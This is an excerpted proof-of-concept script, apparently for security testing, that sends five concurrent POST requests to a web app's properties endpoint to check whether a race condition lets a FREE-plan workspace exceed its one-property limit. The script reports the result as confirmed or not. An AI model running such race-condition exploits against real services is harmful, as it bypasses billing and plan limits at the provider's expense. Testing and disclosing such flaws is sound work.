...
async function run() {
  ...
  await prisma.property.deleteMany({
    where: { workspaceId: attackerWorkspace.id },
  });
  ...
  const requests = Array.from({ length: 5 }).map((_, i) => {
    return fetch(
      `${baseUrl}/api/workspaces/${attackerWorkspace.id}/properties`,
      {
        method: "POST",
        headers: {
  ...
  if (successCount > 1) {
    console.log(
      "✅ VULNERABILITY CONFIRMED: Bypassed FREE plan limit (1 property) via race condition!",
    );
  } else {
    console.log(
      "❌ VULNERABILITY NOT EXPLOITED: Limit was enforced (or race condition didn't hit).",
    );
  }
